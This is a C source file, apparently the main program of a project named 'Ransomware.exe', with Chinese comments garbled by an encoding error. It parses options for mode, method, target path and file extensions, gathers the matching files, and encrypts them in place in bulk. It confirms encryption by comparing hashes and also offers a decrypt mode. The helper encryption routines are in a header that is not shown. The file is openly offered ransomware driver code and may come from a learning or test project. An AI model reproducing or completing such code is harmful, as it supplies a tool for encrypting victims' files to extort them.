#include <stdio.h>
#include <io.h>
#include <stdlib.h>
#include <string.h>
#include "info.h"

// ���visual studio���ڲ���ȫ����ʹ�õı���
#pragma warning(disable : 4996)

/**
* ʹ�÷�ʽ
*
* �����������£�
* .\Ransomware.exe -mode encrypt -method 3 -path E:\\CProjects\\TestEncrypt\\ -extension *.txt
* �����������£�
* .\Ransomware.exe encrypt -mode decrypt -method 3 -path E:\\CProjects\\TestEncrypt\\ -extension *.txt
* 
* ����˵�����£�
*	-mode		�÷���-mode encrypt �� -mode decrypt 
				˵����ָ�����ܻ��ǽ���
*	-method		�÷���-method 0 
				˵������4��ѡ�� -> 0��1��2��3���ֱ�������ּӽ��ܷ�ʽ��
*	-path		�÷���-path E:\\CProjects\\TestEncrypt\\ 
				˵������Ҫ������·��
*	-extension 
				�÷���-extension *.txt,calc.exe,*.docx,*.pdf 
				˵������Ҫ�ӽ��ܵĺ�׺���ö��ŷָ�
*
**/
int main(int argc, char* argv[]) {
	//// �����û�������
	//char** findExtension;
	//findExtension = malloc((argc - 1) * sizeof(char*));

	//for (int count = 1; count < argc; count++) {
	//	// Ϊ�û������ַ��������ڴ�ռ�
	//	findExtension[(count - 1)] = malloc((strlen(argv[count]) + 1) * sizeof(char));
	//	strcpy(findExtension[(count - 1)], argv[count]);
	//}

	//// ������Ҫ������·��
	///*char* findExtension[] = {"E:\\CProjects\\test_encrypt\\*.txt", "E:\\CProjects\\test_encrypt\\*.exe", "E:\\CProjects\\test_encrypt\\*.docx"};*/
	///*int findExtensionLength = sizeof(findExtension) / sizeof(findExtension[0]);*/
	//int findExtensionLength = argc - 1;

	// �û�������������޶�
	if (argc != 9) {
		fprintf(stderr, "Usage:\n");
		return 1;
	}

	char* mode = NULL;
	char* method = NULL;
	char* path = NULL;
	char* extension = NULL;

	// ��ȡ�û��������
	for (int i = 0; i < 4; i++) {
		int opt = 1 + 2 * i;

		if (strcmp(argv[opt], "-mode") == 0) {
			mode = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(mode, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-method") == 0) {
			method = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(method, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-path") == 0) {
			path = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(path, argv[opt + 1]);
		}
		else if (strcmp(argv[opt], "-extension") == 0) {
			extension = calloc(strlen(argv[opt + 1]) + 1, sizeof(char));
			strcpy(extension, argv[opt + 1]);
		}
		else {
			fprintf(stderr, "Usage:\n");
			return 1;
		}
	}

	// ��ӡ�û����������
	/*printf("mode: %s\n path: %s\n extension: %s\n method %s\n", mode, path, extension, method);*/

	// �����û�����ĺ�׺�ַ����ĳ���
	int extension_length = strlen(extension);

	// ͳ�ƺ�׺������
	int extension_num = 0;
	for (int i = 0; i <= extension_length; i++) {
		if (extension[i] == ',' || extension[i] == '\0') {
			extension_num += 1;
		}
	}

	// ƴ��Ŀ¼�ͺ�׺�������䱣��Ϊ����
	char** findExtension = path_concat_ext(extension, path);

	// ��ӡ��ȡ��������
	/*for (int i = 0; i < extension_num; i++) {
		printf("concat extension: %s\n", findExtension[i]);
	}*/

	// check�û��Ǽ��ܻ��ǽ���
	if (strcmp(mode, "encrypt") == 0) {
		printf("����ִ�м���\n");

		// ָ��ExistFile�ṹ�������ָ��
		ExistFile* exist_files;

		// �ṹ�����鳤��
		int exist_files_length;

		printf("�ռ��ļ���Ϣ[+]\n");
		// �����ض���׺�ļ����浽ExistFile�ṹ������
		exist_files = retrieve(findExtension, extension_num);
		exist_files_length = exist_files->file_num;

		printf("��������ԭʼ�ļ���hash[+]\n");
		// ��������ԭʼ�ļ���hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			char* origin_file_hash = generate_hash(exist_files->file_path);
			int hash_length = 20;
			exist_files->origin_file_hash = (char*)malloc(hash_length);
			strcpy(exist_files->origin_file_hash, origin_file_hash);
		}

		// �ָ�exist_filesָ�뵽��ʼλ��
		exist_files -= exist_files_length;

		printf("���������ļ�[+]\n");
		// �������ļ����м���
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			encrypt_file(exist_files->file_path, atoi(method));
		}

		// �ָ�exist_filesָ�뵽��ʼλ��
		exist_files -= exist_files_length;

		printf("�������м����ļ���hash[+]\n");
		// �������м����ļ���hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			char* encrypt_file_hash = generate_hash(exist_files->file_path);
			int hash_length = 20;
			exist_files->encrypt_file_hash = (char*)malloc(hash_length);
			strcpy(exist_files->encrypt_file_hash, encrypt_file_hash);
		}

		// �ָ�exist_filesָ�뵽��ʼλ��
		exist_files -= exist_files_length;

		printf("�Ա��ļ�����ǰ���hash[+]\n");
		// �Ա��ļ�����ǰ��hash
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			int encrypt_result = 0;
			encrypt_result = compare_hash(exist_files->origin_file_hash, exist_files->encrypt_file_hash);

			// ǰ��hash��һ�£���������ܳɹ�
			if (encrypt_result != 0) {
				printf("�ļ�����: %s, �ļ�·�� %s, encrypt successfully!\n", exist_files->file_name, exist_files->file_path);
			}
		}

		// �ָ�exist_filesָ�뵽��ʼλ��
		exist_files -= exist_files_length;

		// �ͷ����ж�̬������ڴ�
		// �ͷ��ļ�����·�������ڴ�
		for (int i = 0; i < extension_num; i++) {
			free(findExtension[i]);
		}
		free(findExtension);

		// �ͷ��ļ��ṹ�������ڴ�
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			free(exist_files->file_name);
			free(exist_files->file_path);
			free(exist_files->origin_file_hash);
			free(exist_files->encrypt_file_hash);
		}
		exist_files -= exist_files_length;
		free(exist_files);
	}
	else if (strcmp(mode, "decrypt") == 0) {

		// ָ��ExistFile�ṹ�������ָ��
		ExistFile* exist_files;

		// �ṹ�����鳤��
		int exist_files_length;

		printf("�ռ��ļ���Ϣ[+]\n");
		// �����ض���׺�ļ����浽ExistFile�ṹ������
		exist_files = retrieve(findExtension, extension_num);
		exist_files_length = exist_files->file_num;

		// �������ļ����н���
		printf("�Լ��ܵ��ļ����н���[+]\n");
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			decrypt_file(exist_files->file_path, atoi(method));
		}

		// �ָ�exist_filesָ�뵽��ʼλ��
		exist_files -= exist_files_length;

		// �ͷ����ж�̬������ڴ�
		//
		for (int i = 0; i < extension_num; i++) {
			free(findExtension[i]);
		}
		free(findExtension);

		// 
		for (int i = 0; i < exist_files_length; i++, exist_files++) {
			free(exist_files->file_name);
			free(exist_files->file_path);
		}
		exist_files -= exist_files_length;
		free(exist_files);
	}
	else {
		printf("%s ����-mode������ָ����ǰ���ܻ��ǽ���\n", findExtension[0]);
		exit(0);
	}
}
